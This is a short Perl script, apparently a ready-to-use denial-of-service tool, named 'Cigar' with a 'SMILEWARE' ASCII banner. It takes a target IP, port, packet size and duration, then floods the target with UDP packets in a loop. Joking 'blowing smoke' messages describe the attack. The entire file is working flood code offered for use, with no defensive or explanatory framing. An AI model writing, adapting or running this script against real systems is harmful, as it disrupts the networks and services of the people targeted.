#!/usr/bin/perl

use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;

##
# Cigar
##

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print BOLD RED<<EOTEXT;
                                              
           .-.                                
  .--.    ( __)   .--.     .---.   ___ .-.    
 /    \   (''")  /    \   / .-, \ (   )   \   
|  .-. ;   | |  ;  ,-. ' (__) ; |  | ' .-. ;  
|  |(___)  | |  | |  | |   .'`  |  |  / (___) 
|  |       | |  | |  | |  / .'| |  | |        
|  | ___   | |  | |  | | | /  | |  | |        
|  '(   )  | |  | '  | | ; |  ; |  | |        
'  `-' |   | |  '  `-' | ' `-'  |  | |        
 `.__,'   (___)  `.__. | `.__.'_. (___)       
                 ( `-' ;                      
                  `.__.                        
		
Lighted By SMILEWARE		

EOTEXT

print "Just blowing smoke towards $ip " . ($port ? $port : "random") . " port with " . 
  ($size ? "$size-byte" : "random size") . " powered smokes" . 
  ($time ? " for $time seconds" : "") . "\n";
print "Throw away the cigar with Ctrl-C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}